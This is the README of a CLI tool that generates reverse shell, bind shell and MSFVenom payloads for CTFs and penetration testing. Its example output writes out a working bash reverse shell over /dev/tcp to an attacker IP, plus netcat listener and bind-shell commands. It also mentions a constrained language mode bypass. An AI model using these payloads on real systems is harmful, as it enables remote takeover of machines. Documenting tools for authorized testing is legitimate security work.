# Reverse Shell Generator 

A powerful CLI tool for generating reverse shells, bind shells, and payloads for CTFs and authorized penetration testing.
![Demo Video](/assets/image.gif)

## Features

-  **200+ Reverse Shell Payloads** - Extensive collection for various platforms
-  **Multi-Platform Support** - Linux, Windows, macOS, Android, and more
-  **Multiple Shell Types** - Reverse shells, bind shells, MSFVenom payloads, HoaxShell
-  **Clipboard Integration** - Copy commands with one click
-  **Listener Commands** - Auto-generated listener commands for your setup
-  **Beautiful CLI** - Interactive and user-friendly interface
-  **Quick Filtering** - Filter by platform and shell type

## Installation

### Prerequisites

- **Node.js** (v14 or higher)
- **npm** (comes with Node.js)

### Step 1: Clone or Download

```bash
# Clone the repository
git clone https://github.com/RicheByte/revShell
cd revShell

# OR download and extract the files to a directory
```

### Step 2: Install Dependencies

```bash
npm install chalk inquirer clipboardy
```

### Step 3: Install Clipboard Support (Linux) Optional if GUI is available 

**For clipboard functionality on Linux, install xclip:**

```bash
# Ubuntu/Debian
sudo apt update && sudo apt install xclip

# CentOS/RHEL
sudo yum install xclip

# Arch Linux
sudo pacman -S xclip
```

### Step 4: Make Executable (Optional)

```bash
chmod +x src/index.js
```
![example screensots](/assets/commands.png)
## Usage

### Basic Usage

```bash
# Run directly with Node.js
node src/index.js

# OR if you made it executable
./src/index.js
```

### Global Installation (Optional)

```bash
# Install globally
npm install -g .

# Then run from anywhere
revshell-maker
```

## Quick Start Guide

1. **Start the tool:**
   ```bash
   node src/index.js
   ```

2. **Follow the interactive prompts:**
   - Enter your **IP address** (attacker machine)
   - Enter **port number** (default: 4444)
   - Select **target platform** (Linux, Windows, macOS)
   - Choose **shell type** (Reverse Shell, Bind Shell, MSFVenom)
   - Select specific payload from the list

3. **Use the generated payload:**
   - Copy the command to clipboard (if supported)
   - Run the listener command shown (for reverse shells)
   - Execute the payload on the target machine

## Examples
![example screensots](/assets/example.png)
### Reverse Shell Example
```
┌─────────────────────────────────────┐
│        Reverse Shell Generator      │
│         CTF/Pentesting Tool         │
│   Generate reverse shells for       │
│     various platforms               │
└─────────────────────────────────────┘

? Enter your IP address: 10.0.0.5
? Enter port number: 4444
? Select target platform: Linux
? Select shell type: Reverse Shell
? Select reverse shell commands: Bash -i (linux, mac, ReverseShell)

════════════════════════════════════════
✓ Reverse Shell Generated Successfully!
════════════════════════════════════════

┌───────────────── Bash -i ──────────────────┐
│                                            │
│ Platform: linux                            │
│                                            │
│ /bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1 │
│                                            │
└────────────────────────────────────────────┘

Listener Commands:
Run one of these on your machine to receive the connection:

$ nc -lvnp 4444
   # nc

? Copy command to clipboard? Yes
✓ Command copied to clipboard!
```

### Bind Shell Example
```
? Enter your IP address: 192.168.1.100
? Enter port number: 8888
? Select target platform: Windows  
? Select shell type: Bind Shell
? Select bind shell commands: PHP Bind (bind, windows, BindShell)

════════════════════════════════════════
✓ Bind Shell Generated Successfully!
════════════════════════════════════════

Connection Commands:
Run one of these to connect to the bind shell:

$ nc 192.168.1.100 8888
   # nc
```

## Supported Platforms & Languages

### Operating Systems
- **Linux** (Debian, Ubuntu, CentOS, etc.)
- **Windows** (cmd, PowerShell, ConPty)
- **macOS** 
- **Android** (via MSFVenom)
- **iOS** (via MSFVenom)

### Programming Languages
- Bash, PowerShell, Python, Perl, PHP, Ruby
- C, C#, Java, JavaScript, Node.js
- Golang, Rust, Haskell, Dart, Crystal
- Awk, Lua, Groovy, Vlang
- And many more!

## Shell Types Available

### 1. Reverse Shells
- Target connects back to your machine
- You run a listener on your machine
- **Use when:** You can execute commands on the target

### 2. Bind Shells  
- Target listens on a port
- You connect to the target
- **Use when:** Target has open ports/firewall allows inbound

### 3. MSFVenom Payloads
- Metasploit payloads for various platforms
- Staged and stageless payloads
- Meterpreter and standard shells

### 4. HoaxShell
- Advanced PowerShell/CMD payloads
- HTTPS support
- Constrained language mode bypass

## Troubleshooting

### Clipboard Not Working
```bash
# Install xclip on Linux
sudo apt install xclip

# On macOS, pbcopy is built-in
# On Windows, clipboard should work automatically
```

### Node.js Version Issues
```bash
# Check Node.js version
node --version

# If below v14, update Node.js
# Using nvm (recommended)
nvm install --lts
nvm use --lts
```

### Permission Denied
```bash
# Make the script executable
chmod +x src/index.js

# Or run with node directly
node src/index.js
```

## Legal Disclaimer

 **This tool is for authorized penetration testing and CTF competitions only.**

- Only use on systems you own or have explicit permission to test
- Unauthorized use is illegal and unethical
- The authors are not responsible for misuse
- Always comply with local laws and regulations

## Contributing

Want to add more payloads or improve the tool?

1. Fork the repository
2. Add your payloads to `src/commands.js`
3. Follow the existing format
4. Submit a pull request


## Support

For issues and feature requests:
- Create an issue on GitHub
- Check troubleshooting section above
- Ensure all dependencies are installed

---

**Happy Hacking! ❤️** 

